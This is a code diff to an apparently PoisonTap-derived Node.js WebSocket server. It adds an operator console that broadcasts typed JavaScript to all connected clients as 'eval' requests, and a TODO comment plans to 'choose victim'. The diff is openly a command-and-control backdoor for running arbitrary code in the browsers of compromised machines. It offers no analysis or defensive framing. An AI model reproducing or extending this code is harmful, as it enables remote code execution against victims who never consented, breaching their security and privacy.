@@ -1,4 +1,5 @@
-// PoisonTap by Samy Kamkar - https://samy.pl/poisontap
+// CREDITS
+// based on PoisonTap by Samy Kamkar
 
 //var _ = require('underscore')
 var WebSocketServer = require('websocket').server
@@ -91,16 +92,16 @@ wsServer.on('request', (request) => {
         conns.splice(i, 1)
   })
 })
-console.log('test');
 
+//START interface
 var stdin = process.openStdin();
-
+//TODO list help en start here (make function to be recalled)
+console.log("");
+console.log("Typed javascript-commands will be sent to all connected clients");
 stdin.addListener("data", function(d) {
-	    // note:  d is an object, and when converted to a string it will
-    // end with a linefeed.  so we (rather crudely) account for that  
-         // with toString() and then trim() 
-     console.log("you entered: [" + 
-     d.toString().trim() + "]");
-    for (var i in conns)
-      conns[i].sendUTF(JSON.stringify({ request: 'eval', content: d.toString().trim() }))
+	var command = d.toString().trim();
+	//TODO TEMP SEND TO ALL -> later make layers and choose victim (not like this)
+	for (var i in conns)
+		conns[i].sendUTF(JSON.stringify({ request: 'eval', content: command }))
+	console.log("COMMAND SENT: "+command);
 });
